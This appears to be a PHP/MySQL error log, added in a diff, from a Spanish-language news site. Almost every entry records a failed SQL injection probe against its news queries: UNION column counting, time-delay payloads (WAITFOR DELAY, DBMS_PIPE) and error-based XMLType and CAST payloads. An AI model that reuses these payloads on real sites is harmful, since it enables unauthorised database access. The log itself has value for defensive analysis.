+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZWGH
+
+Time : 10:42:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- xNIu' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- xNIu
+
+Time : 10:42:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- yHts' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- yHts
+
+Time : 10:42:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL-- loDa' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL-- loDa
+
+Time : 10:42:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL-- pqkl' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL-- pqkl
+
+Time : 10:42:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL-- tTQx' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL-- tTQx
+
+Time : 10:42:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL-- LyTe' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL-- LyTe
+
+Time : 10:42:18
+SQLSTATE[42S22]: Column not found: 1054 Unknown column '1' in 'order clause'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 ORDER BY 1-- ENUY
+
+Time : 10:42:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HWEi' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HWEi
+
+Time : 10:42:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cEut' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cEut
+
+Time : 10:42:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TXJq' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TXJq
+
+Time : 10:42:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HaHV' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HaHV
+
+Time : 10:42:17
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- Vajg' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- Vajg
+
+Time : 10:42:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- JUMW' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- JUMW
+
+Time : 10:42:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(116)||CHR(82)||CHR(104)||CHR(69),5) FROM DU' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(116)||CHR(82)||CHR(104)||CHR(69),5) FROM DUAL--' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL-- DdMF' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) UNION ALL SELECT NULL,NULL,NULL,NULL-- DdMF
+
+Time : 10:42:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(116)||CHR(82)||CHR(104)||CHR(69),5) FROM DU' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(116)||CHR(82)||CHR(104)||CHR(69),5) FROM DUAL--' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL-- kppC' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) UNION ALL SELECT NULL,NULL,NULL-- kppC
+
+Time : 10:42:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(116)||CHR(82)||CHR(104)||CHR(69),5) FROM ' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(116)||CHR(82)||CHR(104)||CHR(69),5) FROM DUAL--' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL-- ojnh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) UNION ALL SELECT NULL,NULL-- ojnh
+
+Time : 10:42:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL-- RSAc' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) UNION ALL SELECT NULL-- RSAc
+
+Time : 10:42:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') ORDER BY 1-- VVPo' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) ORDER BY 1-- VVPo
+
+Time : 10:42:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WAITFOR DELAY '0:0:5'--' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%';WAITFOR DELAY '0:0:5'--' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(84)||CHR(79)||CHR(68),5) FROM DU' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(84)||CHR(79)||CHR(68),5) FROM DUAL--
+
+Time : 10:42:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WAITFOR DELAY '0:0:5'--' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local';WAITFOR DELAY '0:0:5'--' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(84)||CHR(79)||CHR(68),5) FROM DU' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(84)||CHR(79)||CHR(68),5) FROM DUAL--
+
+Time : 10:42:14
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');WAITFOR DELAY '0:0:5'--' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local');WAITFOR DELAY '0:0:5'--' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(84)||CHR(79)||CHR(68),5) FROM D' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(84)||CHR(79)||CHR(68),5) FROM DUAL--
+
+Time : 10:42:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0:0:5'--' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local;WAITFOR DELAY '0:0:5'--' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(84)||CHR(79)||CHR(68),5) FROM DUAL' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(84)||CHR(79)||CHR(68),5) FROM DUAL--
+
+Time : 10:42:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0:0:5'--' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local);WAITFOR DELAY '0:0:5'--' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(84)||CHR(79)||CHR(68),5) FROM DU' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(84)||CHR(79)||CHR(68),5) FROM DUAL--
+
+Time : 10:42:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0:0:5'--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%';WAITFOR DELAY '0:0:5'--
+
+Time : 10:42:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '';WAITFOR DELAY '0:0:5'--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220';WAITFOR DELAY '0:0:5'--
+
+Time : 10:42:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '');WAITFOR DELAY '0:0:5'--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220');WAITFOR DELAY '0:0:5'--
+
+Time : 10:42:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WAITFOR DELAY '0:0:5'--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220;WAITFOR DELAY '0:0:5'--
+
+Time : 10:42:11
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');WAITFOR DELAY '0:0:5'--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220);WAITFOR DELAY '0:0:5'--
+
+Time : 10:42:10
+SQLSTATE[42000]: Syntax error or access violation: 1305 FUNCTION chihuahuahoy.XMLType does not exist
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' AND 5668=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (5668=5668) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:09
+SQLSTATE[42000]: Syntax error or access violation: 1305 FUNCTION chihuahuahoy.XMLType does not exist
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' AND 5668=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (5668=5668) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'HkNr'='HkNr' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND 5668=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(107)|' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') AND 5668=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (5668=5668) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND ('edxN'='edxN' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '::text||(CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)))' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(SELECT (CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (6143=6143) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)))
+
+Time : 10:42:08
+SQLSTATE[42000]: Syntax error or access violation: 1305 FUNCTION chihuahuahoy.XMLType does not exist
+Raw SQL : SELECT * FROM noticias WHERE id = '10220%' AND 6291=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6291=6291) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='' ORDER BY date DESC LIMIT 1
+
+Time : 10:42:08
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 6291=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)|' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' AND 6291=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6291=6291) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'qEWx'='qEWx
+
+Time : 10:42:08
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND 6291=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') AND 6291=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6291=6291) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND ('LHeD'='LHeD
+
+Time : 10:42:07
+SQLSTATE[42000]: Syntax error or access violation: 1305 FUNCTION chihuahuahoy.XMLType does not exist
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 AND 6291=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6291=6291) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)-- AMlc
+
+Time : 10:42:07
+SQLSTATE[42000]: Syntax error or access violation: 1305 FUNCTION chihuahuahoy.XMLType does not exist
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 AND 6291=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6291=6291) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)
+
+Time : 10:42:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND 8142 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') AND 8142 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (8142=8142) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(106)+CHAR(113))) AND ('ZrTA'='ZrTA' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND 6291=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)|' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) AND 6291=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6291=6291) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND (3905=3905
+
+Time : 10:42:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 4798 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' AND 4798 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (4798=4798) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113))) AND 'pGxz'='pGxz
+
+Time : 10:42:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND 4798 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELEC' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') AND 4798 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (4798=4798) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113))) AND ('Hxmw'='Hxmw
+
+Time : 10:42:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '::text||(CHR(113)||CHR(118)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND '%'='' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' AND 9898=CAST((CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9898=9898) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND '%'='' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '::text||(CHR(113)||CHR(118)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND 'iIqV' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' AND 9898=CAST((CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9898=9898) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND 'iIqV'='iIqV' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND 9898=CAST((CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CAS' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') AND 9898=CAST((CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9898=9898) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND ('FLhN'='FLhN' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND 4798 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) AND 4798 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (4798=4798) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113))) AND (6556=6556
+
+Time : 10:42:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '::text||(CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND '%'='' at line 1
+Raw SQL : SELECT * FROM noticias WHERE id = '10220%' AND 9553=CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9553=9553) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND '%'='' ORDER BY date DESC LIMIT 1
+
+Time : 10:42:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 9553=CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CAS' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' AND 9553=CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9553=9553) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND 'uUKn'='uUKn
+
+Time : 10:42:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND 9553=CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CA' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') AND 9553=CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9553=9553) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND ('TUXK'='TUXK
+
+Time : 10:42:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '::text||(CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)-- nxXS' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 AND 9553=CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9553=9553) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)-- nxXS
+
+Time : 10:42:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '::text||(CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 AND 9553=CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9553=9553) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)
+
+Time : 10:42:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND 9553=CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CAS' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220) AND 9553=CAST((CHR(113)||CHR(107)||CHR(106)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9553=9553) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND (7851=7851
+
+Time : 09:36:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 04:06:52
